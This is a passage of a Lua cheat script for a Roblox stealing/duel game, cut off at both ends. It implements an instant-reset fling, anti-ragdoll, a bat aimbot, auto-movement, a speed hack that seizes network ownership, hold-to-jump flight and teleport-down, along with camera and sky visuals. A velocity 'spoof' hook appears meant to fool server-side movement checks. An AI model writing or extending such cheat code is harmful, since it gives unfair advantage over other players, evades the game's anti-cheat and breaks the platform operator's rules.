            visionRagdollTimer.endTime = now + visionRagdollTimer.duration
            label.Text = string.format("%.1f", visionRagdollTimer.duration)
        end
        if visionRagdollTimer.active then
            local remaining = visionRagdollTimer.endTime - now
            if remaining <= 0 then
                visionRagdollTimer.active = false
                visionRagdollTimer.goUntil = now + 0.65
                label.Text = "GO"
            else
                label.Text = string.format("%.1f", remaining)
            end
        elseif visionRagdollTimer.goUntil > now then
            label.Text = "GO"
        else
            label.Text = ""
        end
        visionRagdollTimer.wasRagdolled = ragdolled
    end)
end

-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
-- Forward declarations used by features defined later in the script.
startAntiRagdoll, stopAntiRagdoll = nil, nil
startBatCounter, stopBatCounter = nil, nil
setBatAimbot = nil
triggerBatCounter = nil
stopDropBrainrot = nil
startAutoLeft, stopAutoLeft, startAutoRight, stopAutoRight = nil, nil, nil, nil

-- Instant Reset adapted from Ace Duels.
-- Uses Ace's pulse/queue/camera flow and Vision's local guard APIs.
aceInstaResetState = _G._AceInstaResetState or {}
_G._AceInstaResetState = aceInstaResetState

for _, connection in ipairs(aceInstaResetState.connections or {}) do
    pcall(function() connection:Disconnect() end)
end
if aceInstaResetState.cameraConnection then
    pcall(function() aceInstaResetState.cameraConnection:Disconnect() end)
end
aceInstaResetState.connections = {}
aceInstaResetState.cameraConnection = nil
aceInstaResetState.busy = false
aceInstaResetState.busyAt = 0
aceInstaResetState.queued = false
aceInstaResetState.queuedUntil = 0
aceInstaResetState.token = 0
aceInstaResetState.cameraHeld = false
aceInstaResetState.cameraHeldAt = 0
aceInstaResetState.suspended = nil
aceInstaResetState.speed = tonumber(aceInstaResetState.speed) or 1000000

resetHeartbeat = RunService.PreSimulation or RunService.Heartbeat
local function registerResetConnection(connection)
    table.insert(aceInstaResetState.connections, connection)
    return connection
end

local function suspendVisionGuards()
    local state = {antiRagdoll = false, batCounter = false, batAimbot = false, autoLeft = false, autoRight = false, movement = false}
    if S.antiRagdollEnabled then
        state.antiRagdoll = true
        S.antiRagdollEnabled = false
        if stopAntiRagdoll then pcall(stopAntiRagdoll) end
        if S.setAntiRagVisual then pcall(S.setAntiRagVisual, false) end
    end
    if S.batCounterEnabled then
        state.batCounter = true
        S.batCounterEnabled = false
        if stopBatCounter then pcall(stopBatCounter) end
        if S.setBatCounterVisual then pcall(S.setBatCounterVisual, false) end
    end
    if S.batAimbotEnabled then
        state.batAimbot = true
        if setBatAimbot then pcall(setBatAimbot, false) end
    end
    if S.autoLeftEnabled then state.autoLeft = true end
    if S.autoRightEnabled then state.autoRight = true end
    if S.moveConn then state.movement = true end
    if state.autoLeft then
        S.autoLeftEnabled = false
        if stopAutoLeft then pcall(stopAutoLeft) end
        if S.autoLeftSetVisual then pcall(S.autoLeftSetVisual, false) end
    end
    if state.autoRight then
        S.autoRightEnabled = false
        if stopAutoRight then pcall(stopAutoRight) end
        if S.autoRightSetVisual then pcall(S.autoRightSetVisual, false) end
    end
    if S.dropBrainrotActive and stopDropBrainrot then pcall(stopDropBrainrot) end
    if S.stopMovement then pcall(S.stopMovement) end
    S._unifiedGamepadHeld = false
    S._unifiedTouchHeld = false
    S.holdJumpPressed = false
    S.holdJumpActive = false
    aceInstaResetState.suspended = state
    return state
end

local function restoreVisionGuards(state)
    state = state or aceInstaResetState.suspended or {}
    aceInstaResetState.suspended = nil
    if state.antiRagdoll then
        S.antiRagdollEnabled = true
        if startAntiRagdoll then pcall(startAntiRagdoll) end
        if S.setAntiRagVisual then pcall(S.setAntiRagVisual, true) end
    end
    if state.batCounter then
        S.batCounterEnabled = true
        if startBatCounter then pcall(startBatCounter) end
        if S.setBatCounterVisual then pcall(S.setBatCounterVisual, true) end
    end
    if state.batAimbot and setBatAimbot then pcall(setBatAimbot, true) end
    if state.autoLeft then
        S.autoLeftEnabled = true
        if startAutoLeft then pcall(startAutoLeft) end
        if S.autoLeftSetVisual then pcall(S.autoLeftSetVisual, true) end
    end
    if state.autoRight then
        S.autoRightEnabled = true
        if startAutoRight then pcall(startAutoRight) end
        if S.autoRightSetVisual then pcall(S.autoRightSetVisual, true) end
    end
    if state.movement and S.startMovement then pcall(S.startMovement) end
    if updateFloatingButtons then pcall(updateFloatingButtons) end
    if saveConfig then pcall(saveConfig) end
end

local function holdResetCamera(oldCharacter)
    local currentCamera = workspace.CurrentCamera
    if not currentCamera then return end
    if aceInstaResetState.cameraHeld and (os.clock() - (aceInstaResetState.cameraHeldAt or 0)) < 5 then return end
    aceInstaResetState.cameraHeld = true
    aceInstaResetState.cameraHeldAt = os.clock()
    local heldCFrame, heldFocus = currentCamera.CFrame, currentCamera.Focus
    pcall(function()
        currentCamera.CameraType = Enum.CameraType.Scriptable
        currentCamera.CFrame = heldCFrame
        currentCamera.Focus = heldFocus
    end)
    aceInstaResetState.cameraConnection = RunService.RenderStepped:Connect(function()
        if workspace.CurrentCamera ~= currentCamera then return end
        pcall(function()
            currentCamera.CameraType = Enum.CameraType.Scriptable
            currentCamera.CFrame = heldCFrame
            currentCamera.Focus = heldFocus
        end)
    end)
    task.spawn(function()
        local elapsed = 0
        while LP.Character == oldCharacter and elapsed < 3 do elapsed += task.wait() end
        if aceInstaResetState.cameraConnection then
            pcall(function() aceInstaResetState.cameraConnection:Disconnect() end)
            aceInstaResetState.cameraConnection = nil
        end
        local newCharacter = LP.Character
        aceInstaResetState.cameraHeld = false
        local newCamera = workspace.CurrentCamera or currentCamera
        if newCamera then
            pcall(function()
                newCamera.CameraType = Enum.CameraType.Custom
                local humanoid = newCharacter and newCharacter:FindFirstChildOfClass("Humanoid")
                if humanoid then newCamera.CameraSubject = humanoid end
            end)
        end
    end)
end

local function releaseResetCamera()
    if aceInstaResetState.cameraConnection then
        pcall(function() aceInstaResetState.cameraConnection:Disconnect() end)
        aceInstaResetState.cameraConnection = nil
    end
    aceInstaResetState.cameraHeld = false
end

local function aceFlingUp(character)
    local root = character and character:FindFirstChild("HumanoidRootPart")
    if not (root and root:IsA("BasePart")) then return false end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        pcall(function()
            humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
            humanoid.BreakJointsOnDeath = true
            humanoid.PlatformStand = true
            humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
        end)
    end
    local velocity = Vector3.new(0, math.clamp(aceInstaResetState.speed, 1000, 10000000), 0)
    local function pulse()
        if not root.Parent then return false end
        return pcall(function()
            root.AssemblyAngularVelocity = Vector3.zero
            root.AssemblyLinearVelocity = velocity
        end)
    end
    if not pulse() then return false end
    task.spawn(function()
        local elapsed = 0
        while elapsed < 1.2 do
            elapsed += resetHeartbeat:Wait()
            if not root.Parent or LP.Character ~= character then return end
            pulse()
        end
    end)
    return true
end

local function aceHardKill(character)
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end
    pcall(function()
        humanoid.PlatformStand = false
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
        humanoid.BreakJointsOnDeath = true
        if humanoid.MaxHealth == math.huge or humanoid.MaxHealth <= 0 then humanoid.MaxHealth = 100 end
        humanoid.Health = 0
    end)
    pcall(function() character:BreakJoints() end)
end

local function aceInstantReset()
    local character = LP.Character
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    local root = character and character:FindFirstChild("HumanoidRootPart")
    if not (character and humanoid and root and root:IsA("BasePart")) then
        aceInstaResetState.queued = true
        aceInstaResetState.queuedUntil = os.clock() + 12
        return
    end
    if aceInstaResetState.busy and (os.clock() - (aceInstaResetState.busyAt or 0)) < 5 then return end
    aceInstaResetState.busy = true
    aceInstaResetState.busyAt = os.clock()
    aceInstaResetState.token += 1
    local token = aceInstaResetState.token
    S._youtResetInProgress = true
    local suspended = suspendVisionGuards()
    task.spawn(function()
        pcall(function()
            holdResetCamera(character)
            if not aceFlingUp(character) then aceHardKill(character) end
            local elapsed = 0
            while LP.Character == character and elapsed < 1.2 do elapsed += task.wait() end
            if LP.Character == character then
                local currentHumanoid = character:FindFirstChildOfClass("Humanoid")
                if currentHumanoid and currentHumanoid.Health > 0 then aceHardKill(character) end
            end
            local waited = 0
            while LP.Character == character and waited < 8 do waited += task.wait() end
        end)
        if aceInstaResetState.token ~= token then return end
        releaseResetCamera()
        aceInstaResetState.busy = false
        S._youtResetInProgress = false
        restoreVisionGuards(suspended)
    end)
end

registerResetConnection(resetHeartbeat:Connect(function()
    if not aceInstaResetState.busy then return end
    if (os.clock() - (aceInstaResetState.busyAt or 0)) >= 10 then
        aceInstaResetState.busy = false
        releaseResetCamera()
        S._youtResetInProgress = false
        restoreVisionGuards()
    end
end))

registerResetConnection(LP.CharacterAdded:Connect(function(character)
    if not aceInstaResetState.queued then return end
    if (aceInstaResetState.queuedUntil or 0) < os.clock() then
        aceInstaResetState.queued = false
        return
    end
    aceInstaResetState.queued = false
    task.spawn(function()
        local humanoid = character:FindFirstChildOfClass("Humanoid") or character:WaitForChild("Humanoid", 5)
        local root = character:FindFirstChild("HumanoidRootPart") or character:WaitForChild("HumanoidRootPart", 5)
        task.wait(0.15)
        if humanoid and root and humanoid.Health > 0 and LP.Character == character then aceInstantReset() end
    end)
end))

_G._AceInstaReset = aceInstantReset
_G._CandyInstaReset = aceInstantReset
_G._AceInstaResetTune = function(value)
    local number = tonumber(value)
    if number then aceInstaResetState.speed = math.clamp(math.abs(number), 1000, 10000000) end
    return aceInstaResetState.speed
end
_G._CandyInstaResetTune = _G._AceInstaResetTune

_lastRequest = 0
local function sourceInstaResetTrigger()
    local now = os.clock()
    if now - _lastRequest < 0.15 then return end
    _lastRequest = now
    aceInstantReset()
end
_G.InstaReset = {Trigger = sourceInstaResetTrigger}
_G.VynxDoInstaReset = _G.InstaReset.Trigger
_G.visionInstantReset = _G.InstaReset.Trigger
-- Rebind the camera to the Humanoid whenever the character respawns.
LP.CharacterAdded:Connect(function(character)
    task.defer(function()
        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
        if not humanoid and character then humanoid = character:WaitForChild("Humanoid", 5) end
        local camera = workspace.CurrentCamera
        if camera and humanoid then
            pcall(function()
                camera.CameraType = Enum.CameraType.Custom
                camera.CameraSubject = humanoid
            end)
        end
    end)
end)

DROP_FLING_COOLDOWN_FAST = 0.6
DROP_FLING_COOLDOWN_SLOW = 0.25
local function setDropActive(on)
    S.dropBrainrotActive = on
    if S.dropBrainrotSetVisual then pcall(S.dropBrainrotSetVisual, on) end
    if S.dropBrainrotFloatVisual then pcall(S.dropBrainrotFloatVisual, on) end
end

stopDropBrainrot = function()
    S.dropBrainrotActive = false
    if S._dropConn then S._dropConn:Disconnect(); S._dropConn = nil end
    if S._dropThread then pcall(task.cancel, S._dropThread); S._dropThread = nil end
    local character = LP.Character
    local root = character and character:FindFirstChild("HumanoidRootPart")
    if root then
        pcall(function()
            root.AssemblyLinearVelocity = Vector3.zero
            root.AssemblyAngularVelocity = Vector3.zero
        end)
    end
    if S._dropRestoreBat then
        S._dropRestoreBat = false
        setBatAimbot(true)
    end
    setDropActive(false)
end

LP.CharacterRemoving:Connect(function(removingCharacter)
    if S._dropConn then S._dropConn:Disconnect(); S._dropConn = nil end
    if S._dropThread then pcall(task.cancel, S._dropThread); S._dropThread = nil end
    S._dropRestoreBat = false
    S.dropBrainrotActive = false
    if S.dropBrainrotSetVisual then pcall(S.dropBrainrotSetVisual, false) end
    if S.dropBrainrotFloatVisual then pcall(S.dropBrainrotFloatVisual, false) end
end)

local function runDropBrainrot()
    if S.dropBrainrotActive or _G.IsDropping then return end
    local character = LP.Character
    local root = character and character:FindFirstChild("HumanoidRootPart")
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    if not root or not humanoid or humanoid.Health <= 0 or root.Anchored then return end

    local velocity = root.AssemblyLinearVelocity
    local horizontalSpeed = Vector3.new(velocity.X, 0, velocity.Z).Magnitude
    local cooldown = horizontalSpeed > 5 and DROP_FLING_COOLDOWN_FAST or DROP_FLING_COOLDOWN_SLOW
    local now = tick()
    if now - (S.lastDropTime or 0) < cooldown then return end
    S.lastDropTime = now

    -- Guardar el modo actual para que DROP no lo apague ni lo cambie.
    S._dropSpeedMode = S.speedMode == true
    S._dropLaggerMode = tonumber(S.laggerMode) or 0
    S._dropRestoreBat = S.batAimbotEnabled == true
    if S._dropRestoreBat then setBatAimbot(false) end
    setDropActive(true)

    local finished = false
    local function restoreSpeedAfterDrop()
        if S._dropSpeedMode == nil or S._dropLaggerMode == nil then return end
        S.speedMode = S._dropSpeedMode
        S.laggerMode = S._dropLaggerMode
        S._dropSpeedMode = nil
        S._dropLaggerMode = nil
        S.refreshSpeedModeLabel()
        S.applySpeedVelocityNow()
        S.restartMovement()
        if updateFloatingButtons then updateFloatingButtons() end
        saveConfig()
    end
    local function finishDrop()
        if finished then return end
        finished = true
        if S._dropThread then S._dropThread = nil end
        S.dropBrainrotActive = false
        local currentCharacter = LP.Character
        local currentRoot = currentCharacter and currentCharacter:FindFirstChild("HumanoidRootPart")
        local currentHumanoid = currentCharacter and currentCharacter:FindFirstChildOfClass("Humanoid")
        if currentRoot then
            pcall(function()
                currentRoot.AssemblyLinearVelocity = Vector3.zero
                currentRoot.AssemblyAngularVelocity = Vector3.zero
                if currentRoot.Position.Y < -100 then
                    currentRoot.CFrame = CFrame.new(currentRoot.Position.X, 5, currentRoot.Position.Z)
                end
                local params = RaycastParams.new()
                params.FilterDescendantsInstances = {currentCharacter}
                params.FilterType = Enum.RaycastFilterType.Exclude
                local result = workspace:Raycast(currentRoot.Position, Vector3.new(0, -2000, 0), params)
                if result then
                    local offset = (currentHumanoid and currentHumanoid.HipHeight or 2) + currentRoot.Size.Y * 0.5
                    currentRoot.CFrame = CFrame.new(currentRoot.Position.X, result.Position.Y + offset, currentRoot.Position.Z)
                end
            end)
        end
        if currentHumanoid and currentHumanoid.Health > 0 then
            pcall(function() currentHumanoid:ChangeState(Enum.HumanoidStateType.Running) end)
        end
        if S._dropRestoreBat then
            S._dropRestoreBat = false
            setBatAimbot(true)
        end
        setDropActive(false)
        restoreSpeedAfterDrop()
    end

    local thread
    thread = task.spawn(function()
        local startedAt = tick()
        while S.dropBrainrotActive and tick() - startedAt < 0.25 do
            RunService.Heartbeat:Wait()
            local currentCharacter = LP.Character
            local currentRoot = currentCharacter and currentCharacter:FindFirstChild("HumanoidRootPart")
            if not currentRoot then break end
            local currentVelocity = currentRoot.AssemblyLinearVelocity
            local verticalOnly = Vector3.new(0, currentVelocity.Y, 0)
            currentRoot.AssemblyLinearVelocity = verticalOnly * 10000 + Vector3.new(0, 10000, 0)
            RunService.RenderStepped:Wait()
            if currentRoot.Parent then currentRoot.AssemblyLinearVelocity = verticalOnly end
            RunService.Stepped:Wait()
            if currentRoot.Parent then currentRoot.AssemblyLinearVelocity = verticalOnly + Vector3.new(0, 0.1, 0) end
        end
        finishDrop()
    end)
    S._dropThread = thread
    task.delay(0.35, function()
        if S.dropBrainrotActive then finishDrop() end
    end)
end

S.startMovement = function()
    if S.moveConn then S.moveConn:Disconnect(); S.moveConn = nil end
    local movementSignal = RunService.PreSimulation or RunService.Stepped
    S.moveConn = movementSignal:Connect(function(firstDelta, secondDelta)
        local deltaTime = secondDelta or firstDelta or 1 / 60
        if not S.speedEnabled or not S._unifiedMovementEnabled or S._youtResetInProgress then return end
        local char = LP.Character
        local hum = char and (S._vxCachedHum and S._vxCachedHum.Parent and S._vxCachedHum or char:FindFirstChildOfClass("Humanoid"))
        local root = char and (S._vxCachedRoot and S._vxCachedRoot.Parent and S._vxCachedRoot or char:FindFirstChild("HumanoidRootPart"))
        if not char or not hum or not root or hum.Health <= 0 then return end
        S.h, S.hrp = hum, root
        if S.dropBrainrotActive then return end
        if S.batAimbotEnabled or S.autoLeftEnabled or S.autoRightEnabled then
            setLV(root, 0, 0, deltaTime)
            return
        end
        local state = hum:GetState()
        if hum.PlatformStand or state == Enum.HumanoidStateType.Physics
            or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown then
            S.lastMoveDir = Vector3.zero
            setLV(root, 0, 0, deltaTime)
            return
        end
        if S._vxSpeedCheckRoof and S._vxSpeedCheckRoof(root, deltaTime) then
            setLV(root, 0, 0, deltaTime)
            return
        end
        local direction = hum.MoveDirection
        if direction.Magnitude <= 0.05 and S.antiRagdollEnabled and S.lastMoveDir.Magnitude > 0 then
            for key in pairs(S.MOVE_KEYS) do
                if UIS:IsKeyDown(key) then direction = S.lastMoveDir; break end
            end
        end
        if direction.Magnitude > 0.05 then
            direction = Vector3.new(direction.X, 0, direction.Z)
            local magnitude = direction.Magnitude
            if magnitude > 0.001 then
                direction = direction.Unit
                S.lastMoveDir = direction
                pcall(function() if root.SetNetworkOwner then root:SetNetworkOwner(LP) end end)
                local speed = S._unifiedResolveSpeed()
                local horizontal = Vector3.new(direction.X * speed, 0, direction.Z * speed)
                if S._vxSpeedResolveHorizontal then
                    local ok, result = pcall(S._vxSpeedResolveHorizontal, root, hum, horizontal, deltaTime)
                    if ok and typeof(result) == "Vector3" then horizontal = result end
                end
                setLV(root, horizontal.X, horizontal.Z, deltaTime)
            else
                setLV(root, 0, 0, deltaTime)
            end
        else
            setLV(root, 0, 0, deltaTime)
        end
        updateSpeedBillboard(root)
    end)
end

S.stopMovement = function()
    if S.moveConn then S.moveConn:Disconnect(); S.moveConn = nil end
    if clearLV then clearLV() end
end
S.restartMovement = function() S.stopMovement(); S.startMovement() end
S.speedEnabled = true
S.startMovement()

-- ── Hold Jump (ported from the attached Vision; standalone Infinite Jump removed) ──
S.holdJumpPower = 55
S.holdJumpMinVelocity = 35
S.holdJumpFallClamp = -120
S._unifiedCanJump = true
S._unifiedLastJumpTime = S._unifiedLastJumpTime or 0
S._unifiedGamepadHeld = false
S._unifiedTouchHeld = false
S._mobileJumpButtonConns = S._mobileJumpButtonConns or {}
S._mobileJumpWatchConn = nil
S._mobileJumpButton = nil

local function clearHoldJump()
    S.holdJumpPressed = false
    S.holdJumpActive = false
    S._unifiedGamepadHeld = false
    S._unifiedTouchHeld = false
end

local function isJumpInputFocused()
    local ok, focused = pcall(function() return UIS:GetFocusedTextBox() end)
    return ok and focused ~= nil
end

local function getHoldJumpParts()
    local character = LP.Character
    if not character then return nil, nil, nil end
    return character, character:FindFirstChildOfClass("Humanoid"), character:FindFirstChild("HumanoidRootPart")
end

S._unifiedApplyJumpVelocity = function()
    if not S.holdJumpEnabled or not S._unifiedCanJump or S._youtResetInProgress or isJumpInputFocused() then return end
    if S.dropBrainrotActive then return end
    local character, humanoid, root = getHoldJumpParts()
    if not character or not humanoid or not root or humanoid.Health <= 0 then return end

    S._unifiedCanJump = false
    S._unifiedLastJumpTime = os.clock()
    humanoid.Jump = true
    pcall(function() if root.SetNetworkOwner then root:SetNetworkOwner(LP) end end)
    local velocity = root.AssemblyLinearVelocity
    if S._vxSyncSpoof then S._vxSyncSpoof(Vector3.new(velocity.X, 0, velocity.Z)) end
    root.AssemblyLinearVelocity = Vector3.new(velocity.X, S.holdJumpPower, velocity.Z)
    task.delay(0.08, function() S._unifiedCanJump = true end)
end

local function isGamepadInput(input)
    return input.UserInputType.Name:match("^Gamepad%d+$") ~= nil
end

local function bindMobileJumpButton(button)
    for _, connection in ipairs(S._mobileJumpButtonConns) do pcall(function() connection:Disconnect() end) end
    table.clear(S._mobileJumpButtonConns)
    S._unifiedTouchHeld = false
    S._mobileJumpButton = nil
    if not button or not button:IsA("GuiButton") then return end
    S._mobileJumpButton = button
    table.insert(S._mobileJumpButtonConns, button.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            S._unifiedTouchHeld = true
            S.holdJumpPressed = true
        end
    end))
    table.insert(S._mobileJumpButtonConns, button.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then clearHoldJump() end
    end))
    table.insert(S._mobileJumpButtonConns, button.AncestryChanged:Connect(function(_, parent)
        if not parent then clearHoldJump(); S._mobileJumpButton = nil end
    end))
end

local function findMobileJumpButton()
    local playerGui = LP:FindFirstChildOfClass("PlayerGui")
    local button = playerGui and playerGui:FindFirstChild("JumpButton", true)
    if button and button ~= S._mobileJumpButton then bindMobileJumpButton(button) end
end

local function stopHoldJumpConnections()
    clearHoldJump()
    if S.IJ_JumpConn then S.IJ_JumpConn:Disconnect(); S.IJ_JumpConn = nil end
    if S.IJ_InputBeganConn then S.IJ_InputBeganConn:Disconnect(); S.IJ_InputBeganConn = nil end
    if S.IJ_InputEndedConn then S.IJ_InputEndedConn:Disconnect(); S.IJ_InputEndedConn = nil end
    if S.IJ_HoldConn then S.IJ_HoldConn:Disconnect(); S.IJ_HoldConn = nil end
    if S._mobileJumpWatchConn then S._mobileJumpWatchConn:Disconnect(); S._mobileJumpWatchConn = nil end
    for _, connection in ipairs(S._mobileJumpButtonConns) do pcall(function() connection:Disconnect() end) end
    table.clear(S._mobileJumpButtonConns)
    S._mobileJumpButton = nil
    S._unifiedCanJump = true
end

local function ensureHoldJumpConnections()
    if not S.IJ_JumpConn then
        S.IJ_JumpConn = UIS.JumpRequest:Connect(function()
            if S.holdJumpEnabled and not isJumpInputFocused() then S._unifiedApplyJumpVelocity() end
        end)
    end
    if not S.IJ_InputBeganConn then
        S.IJ_InputBeganConn = UIS.InputBegan:Connect(function(input)
            if isJumpInputFocused() then return end
            if input.KeyCode == Enum.KeyCode.Space and input.UserInputType == Enum.UserInputType.Keyboard then
                S.holdJumpPressed = true
            elseif input.KeyCode == Enum.KeyCode.ButtonA and isGamepadInput(input) then
                S._unifiedGamepadHeld = true
                S.holdJumpPressed = true
            end
        end)
    end
    if not S.IJ_InputEndedConn then
        S.IJ_InputEndedConn = UIS.InputEnded:Connect(function(input)
            if input.KeyCode == Enum.KeyCode.Space and input.UserInputType == Enum.UserInputType.Keyboard then
                clearHoldJump()
            elseif input.KeyCode == Enum.KeyCode.ButtonA and isGamepadInput(input) then
                S._unifiedGamepadHeld = false
                if not S._unifiedTouchHeld and not UIS:IsKeyDown(Enum.KeyCode.Space) then clearHoldJump() end
            end
        end)
    end
    if not S.IJ_HoldConn then
        S.IJ_HoldConn = RunService.Heartbeat:Connect(function()
            if not S.holdJumpEnabled or S.dropBrainrotActive or S._youtResetInProgress or isJumpInputFocused() then return end
            local character, humanoid, root = getHoldJumpParts()
            if not character or not humanoid or not root or humanoid.Health <= 0 then return end
            local keyboardHeld = false
            pcall(function() keyboardHeld = UIS:IsKeyDown(Enum.KeyCode.Space) end)
            local jumpHeld = keyboardHeld or humanoid.Jump == true or S._unifiedGamepadHeld == true or S._unifiedTouchHeld == true
            local velocity = root.AssemblyLinearVelocity
            if jumpHeld and velocity.Y < S.holdJumpMinVelocity then S._unifiedApplyJumpVelocity() end
            if velocity.Y < S.holdJumpFallClamp then
                local clamped = Vector3.new(velocity.X, S.holdJumpFallClamp, velocity.Z)
                if S._vxSyncSpoof then S._vxSyncSpoof(clamped) end
                root.AssemblyLinearVelocity = clamped
            end
        end)
    end
    if UIS.TouchEnabled then
        local playerGui = LP:FindFirstChildOfClass("PlayerGui") or LP:WaitForChild("PlayerGui")
        if not S._mobileJumpWatchConn then
            S._mobileJumpWatchConn = playerGui.DescendantAdded:Connect(function(descendant)
                if descendant.Name == "JumpButton" and descendant:IsA("GuiButton") then bindMobileJumpButton(descendant) end
            end)
        end
        task.defer(findMobileJumpButton)
    end
end

local function startHoldJump()
    S.holdJumpEnabled = true
    S.holdJumpMode = true
    ensureHoldJumpConnections()
end

local function stopHoldJump()
    S.holdJumpEnabled = false
    S.holdJumpMode = false
    stopHoldJumpConnections()
end

TP_DOWN_MODE = "full"
S.tpDownHeightTrigger = tonumber(S.tpDownHeightTrigger) or 20

local function tpIsCarryingBrainrot(character)
    if not character then return false end

    -- No usamos simplemente "Stealing == true": durante el hold/progreso
    -- ese estado puede aparecer antes de que el Brainrot quede realmente
    -- en las manos/espalda del jugador.
    local stealingNow = (LP:GetAttribute("Stealing") == true)
        or (character:GetAttribute("Stealing") == true)

    if stealingNow then
        -- Una vez activado, Stealing sí sirve para mantener el estado.
        if S.autoCarryActive then return true end
        -- Mientras está pendiente, solo aceptar el atributo si cambió a true
        -- DESPUÉS de iniciar el robo.
        if S.autoCarryPending and S.autoCarryStealingBefore ~= true then
            return true
        end
    end

    -- Segunda comprobación: el juego suele añadir al Character el objeto/modelo
    -- que representa el Brainrot que queda cargado. Solo contamos objetos nuevos
    -- aparecidos después de iniciar el robo, no los Tools normales (Bat/Slap).
    local snap = S.autoCarryChildSnapshot
    if snap then
        for _, child in ipairs(character:GetChildren()) do
            if not snap[child] then
                local n = child.Name:lower()
                if not (n:find("bat") or n:find("slap") or n:find("animate") or n:find("humanoid")) then
                    if child:IsA("Model") or child:IsA("Tool") or child:IsA("Accessory") or child:IsA("Folder") then
                        return true
                    end
                end
            end
        end
    end

    return false
end

local function runTPDownFull()
    pcall(function()
        local character = LP.Character
        if not character then return end
        local root = character:FindFirstChild("HumanoidRootPart")
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not root or not humanoid then return end

        local worldPosition = root.Position
        if worldPosition.Y <= -7 then
            root.CFrame = CFrame.new(worldPosition.X, -7, worldPosition.Z)
            root.AssemblyLinearVelocity = Vector3.zero
            return
        end

        local rootOffset = (humanoid.HipHeight or 2) + root.Size.Y * 0.5 + 0.2
        local ignoredNames = {"invis", "wall", "trigger", "barrier", "clip", "ghost"}

        local function hasIgnoredName(instance)
            while instance and instance ~= workspace do
                local name = string.lower(instance.Name or "")
                for _, ignored in ipairs(ignoredNames) do
                    if name:find(ignored, 1, true) then return true end
                end
                instance = instance.Parent
            end
            return false
        end

        local function shouldSkip(instance)
            if instance == workspace.Terrain then return false end
            if not instance or not instance:IsA("BasePart") then return true end
            if not instance.CanCollide then return true end
            if (instance.Transparency or 0) >= 0.75 then return true end
            if (instance.LocalTransparencyModifier or 0) >= 0.75 then return true end
            return hasIgnoredName(instance)
        end

        local function findFloorY(origin)
            local params = RaycastParams.new()
            params.FilterType = Enum.RaycastFilterType.Exclude
            params.IgnoreWater = true
            local filter = {character}
            for _ = 1, 80 do
                params.FilterDescendantsInstances = filter
                local hit = workspace:Raycast(origin, Vector3.new(0, -7 - origin.Y, 0), params)
                if not hit then return nil end
                if not shouldSkip(hit.Instance) then return hit.Position.Y end
                table.insert(filter, hasIgnoredName(hit.Instance) and hit.Instance.Parent or hit.Instance)
            end
            return nil
        end

        local radius = math.max(0.75, math.min(2, math.max(root.Size.X, root.Size.Z) * 0.55))
        local offsets = {
            Vector3.zero,
            Vector3.new(radius, 0, 0), Vector3.new(-radius, 0, 0),
            Vector3.new(0, 0, radius), Vector3.new(0, 0, -radius),
            Vector3.new(radius * 0.7, 0, radius * 0.7),
            Vector3.new(-radius * 0.7, 0, radius * 0.7),
            Vector3.new(radius * 0.7, 0, -radius * 0.7),
            Vector3.new(-radius * 0.7, 0, -radius * 0.7),
        }

        local floorY = findFloorY(worldPosition + Vector3.new(0, 0.25, 0))
        if not floorY then
            for i = 2, #offsets do
                local candidate = findFloorY(worldPosition + offsets[i] + Vector3.new(0, 0.25, 0))
                if candidate and (not floorY or candidate > floorY) then floorY = candidate end
            end
        end

        local targetY = -7
        if floorY then
            local candidateY = floorY + rootOffset
            if worldPosition.Y - 0.35 <= candidateY then return end
            targetY = math.max(candidateY, -7)
        end

        local _, yaw = root.CFrame:ToEulerAnglesYXZ()
        root.CFrame = CFrame.new(worldPosition.X, targetY, worldPosition.Z) * CFrame.Angles(0, yaw, 0)
        root.AssemblyLinearVelocity = Vector3.zero
    end)
end

local function executeTPDown()
    if S.dropBrainrotActive or _G.IsDropping then return end
    local character = LP.Character
    local root = character and character:FindFirstChild("HumanoidRootPart")
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    if not character or not root or not humanoid or humanoid.Health <= 0 or root.Anchored or humanoid.Sit or humanoid.SeatPart then return end
    if TP_DOWN_MODE == "full" then runTPDownFull() end
end

_G._VynxRunTPDown = executeTPDown

-- Yout visual features: Vivid Graphics, Stretch Rez, and Sky Theme.
local function applyStretchFOV(val)
    local cam = workspace.CurrentCamera
    if cam then pcall(function() cam.FieldOfView = val end) end
end

local function enableStretch()
    if S.stretchConn then return end
    S.stretchEnabled = true
    local cam = workspace.CurrentCamera
    if not cam then return end
    S.origFOV = cam.FieldOfView or 70
    applyStretchFOV(S.stretchFOV)
    S.stretchConn = RunService.RenderStepped:Connect(function()
        if not S.stretchEnabled then
            S.stretchConn:Disconnect()
            S.stretchConn = nil
            return
        end
        local c = workspace.CurrentCamera
        if c then c.CFrame = c.CFrame * _CFnew(0,0,0,1,0,0,0,0.7,0,0,0,1) end
    end)
    if S.stretchFovConn then S.stretchFovConn:Disconnect() end
    S.stretchFovConn = RunService.RenderStepped:Connect(function()
        if S.stretchEnabled then applyStretchFOV(S.stretchFOV)
        else S.stretchFovConn:Disconnect(); S.stretchFovConn = nil end
    end)
end

local function disableStretch()
    S.stretchEnabled = false
    if S.stretchConn then S.stretchConn:Disconnect(); S.stretchConn = nil end
    if S.stretchFovConn then S.stretchFovConn:Disconnect(); S.stretchFovConn = nil end
    local cam = workspace.CurrentCamera
    if cam then pcall(function() cam.FieldOfView = S.origFOV or 70 end) end
end

SKY_PRESETS_LIST = {"Off","Night","Aurora","Sunset","Galaxy","Cyber","Sakura","Pink Night","Blood Moon","Emerald Dawn","Volcanic","Arctic","Midnight Ocean","Vaporwave","Toxic","Solar Eclipse","Hellscape","Heaven","Storm","Sunrise","Deep Space","Lavender Dream","Inferno","Mint Sky"}

SKY_PRESETS = {
